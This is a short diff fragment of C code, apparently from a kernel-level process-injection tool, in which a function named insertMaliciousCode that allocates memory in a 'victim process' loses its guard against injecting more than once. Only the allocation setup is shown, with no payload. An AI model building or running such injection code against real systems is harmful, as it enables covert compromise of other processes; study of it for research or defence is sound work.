@@ -70,12 +70,6 @@ isVictimThread (struct thread * td) {
 static void *
 insertMaliciousCode (struct thread * td) {
   //
-  // Don't inject anything if we've already done it.
-  //
-  if (injected)
-    return;
-
-  //
   // Allocate some memory within the victim process.
   //
   int error;
